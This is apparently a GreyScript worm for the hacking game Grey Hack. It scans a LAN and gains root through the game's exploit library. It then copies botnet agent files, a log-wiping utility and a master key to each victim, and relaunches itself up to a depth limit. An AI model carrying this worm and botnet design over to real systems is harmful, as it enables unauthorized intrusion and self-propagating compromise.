// worm.gs – final corrected version with depth tracking and correct SCP
import_code("/lib/kyber_lib.gs")
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/accessLevel.gs")
import_code("/scripts/utils/parse_exploit_requirements.gs")
import_code("/scripts/utils/sanitize_ip.gs")

if params.len < 4 then
    // Standalone launch: use defaults
    if params.len >= 1 then
        MASTER_PUB_FILE = params[0]
    else
        MASTER_PUB_FILE = "/root/.botnet/master.pub"
    end if
    if params.len >= 2 then
        MAX_DEPTH = params[1].to_int
    else
        MAX_DEPTH = 3
    end if
    if params.len >= 3 then
        SOURCE_IP = params[2]
    else
        SOURCE_IP = null
    end if
    if params.len >= 4 then
        CURRENT_DEPTH = params[3].to_int
    else
        CURRENT_DEPTH = 0
    end if
else
    MASTER_PUB_FILE = params[0]
    MAX_DEPTH = params[1].to_int
    SOURCE_IP = params[2]
    CURRENT_DEPTH = params[3].to_int
end if

master_pub = read_file(MASTER_PUB_FILE)
if not master_pub then exit("Master public key not found")

INFECTED_FILE = "/root/.botnet/infected.txt"
SPREAD_DELAY = 30
infected_data = read_file(INFECTED_FILE)
if infected_data then
    infected = infected_data.split(char(10))
else
    infected = []
end if
my_ip = get_shell.host_computer.public_ip
my_ip_safe = sanitize_ip(my_ip)

if infected.indexOf(my_ip) == null then
    infected.push(my_ip)
    write_file(INFECTED_FILE, infected.join(char(10)))
end if

log_master("Worm started on " + my_ip_safe + " at depth " + CURRENT_DEPTH + "/" + MAX_DEPTH, "INFO")

scan_lan = function()
    router = get_router
    if router == null then return []
    targets = []
    // FIXED: correct property name
    for ip in router.computers_lan_ip
        if ip == my_ip then continue
        if infected.indexOf(ip) != null then continue
        if SOURCE_IP != null and ip == SOURCE_IP then continue
        targets.push(ip)
    end for
    return targets
end function

exploit_target = function(ip)
    metax = include_lib("/lib/metaxploit.so")
    if not metax then return null
    for port in [22, 80, 443, 8080, 1542]
        for attempt in range(0, 2)
            session = metax.net_use(ip, port)
            if session == null then continue
            lib = session.dump_lib
            if lib == null then continue
            addrs = metax.scan(lib)
            if typeof(addrs) != "list" then continue
            for addr in addrs
                raw = metax.scan_address(lib, addr)
                if typeof(raw) != "string" then continue
                // parse_exploit_requirements returns a map; handle correctly
                reqs = parse_exploit_requirements(raw)
                if typeof(reqs) == "map" and reqs.hasIndex("activeRoot") then
                    vuln_value = reqs["activeRoot"]
                    if vuln_value != null then
                        shell = lib.overflow(addr, vuln_value, "")
                        if shell != null then
                            level = accessLevel(shell)
                            if level == "root" then return shell
                        end if
                    end if
                end if
            end for
            backoff_sleep(attempt, 1, 5)
        end for
    end for
    return null
end function

deploy_to_target = function(shell, target_ip, current_depth)
    target_ip_safe = sanitize_ip(target_ip)
    log_master("Deploying to " + target_ip_safe, "INFO")
    
    // Create local temp directory
    local_tmp = "/tmp/deploy_" + str(time)
    get_shell.host_computer.create_folder("/tmp", "deploy_" + str(time))
    
    // Copy files to local temp
    files_to_copy = ["/bin/slave.gs", "/bin/worm.gs", "/lib/kyber_lib.gs",
                     "/lib/lib_common.gs", MASTER_PUB_FILE]
    for src_path in files_to_copy
        src_file = get_shell.host_computer.File(src_path)
        if src_file then
            src_file.copy(local_tmp, src_path.split("/")[-1])
        end if
    end for
    
    // Copy all utils including file_search.gs
    utils = ["/scripts/utils/accessLevel.gs", "/scripts/utils/wipe_logs.gs",
             "/scripts/utils/sanitize_ip.gs", "/scripts/utils/parse_exploit_requirements.gs",
             "/scripts/utils/file_search.gs"]   // file_search added
    for util in utils
        src_file = get_shell.host_computer.File(util)
        if src_file then
            src_file.copy(local_tmp, util.split("/")[-1])   // FIXED: use util, not src_path
        end if
    end for
    
    // SCP each file from local temp to target using correct method
    for f in get_shell.host_computer.File(local_tmp).get_files
        get_shell.scp(local_tmp + "/" + f.name, "/tmp/", shell)
    end for
    
    // Move files to final destinations
    shell.run("mv /tmp/slave.gs /bin/slave.gs")
    shell.run("mv /tmp/worm.gs /bin/worm.gs")
    shell.run("mv /tmp/kyber_lib.gs /lib/kyber_lib.gs")
    shell.run("mv /tmp/lib_common.gs /lib/lib_common.gs")
    shell.run("mkdir -p /scripts/utils")
    for util in utils
        filename = util.split("/")[-1]
        shell.run("mv /tmp/" + filename + " /scripts/utils/" + filename)
    end for
    shell.run("mkdir -p /root/.botnet")
    shell.run("mv /tmp/master.pub /root/.botnet/master.pub")
    
    shell.launch("/bin/slave.gs")
    
    // FIXED: use current_depth + 1, and pass it as 4th parameter
    new_depth = current_depth + 1
    if new_depth < MAX_DEPTH then
        shell.launch("/bin/worm.gs", [MASTER_PUB_FILE, str(MAX_DEPTH), target_ip, str(new_depth)])
    end if
    
    infected.push(target_ip)
    write_file(INFECTED_FILE, infected.join(char(10)))
    log_master("Deployed to " + target_ip_safe, "SUCCESS")
    
    // Cleanup local temp
    get_shell.host_computer.File(local_tmp).delete
end function

main = function()
    // If already at max depth, do not spread
    if CURRENT_DEPTH >= MAX_DEPTH then
        log_master("Max depth reached, idle mode", "INFO")
        while true
            wait(60)
        end while
    end if
    
    consecutive_failures = 0
    while true
        if scan_lan().len == 0 then
            consecutive_failures = consecutive_failures + 1
            if consecutive_failures > 5 then
                log_master("No targets found, sleeping 5 minutes", "WARN")
                wait(300)
                consecutive_failures = 0
            end if
        else
            consecutive_failures = 0
        end if
        
        for target in scan_lan()
            target_safe = sanitize_ip(target)
            log_master("Attempting " + target_safe, "INFO")
            shell = exploit_target(target)
            if shell then
                log_master("Exploited " + target_safe, "SUCCESS")
                deploy_to_target(shell, target, CURRENT_DEPTH)   // Pass current depth
                backoff_sleep(0, 2, 60)
            else
                log_master("Failed " + target_safe, "WARN")
            end if
        end for
        wait(SPREAD_DELAY)
    end while
end function

main()
